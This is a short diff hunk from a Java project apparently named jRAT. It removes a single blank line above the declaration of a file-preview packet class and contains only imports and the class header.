@@ -5,7 +5,6 @@ import java.io.DataInputStream;
 import pro.jrat.Slave;
 import pro.jrat.ui.frames.FramePreviewFile;
 
-
 public class Packet42PreviewFile extends AbstractIncomingPacket {
 
 	@Override
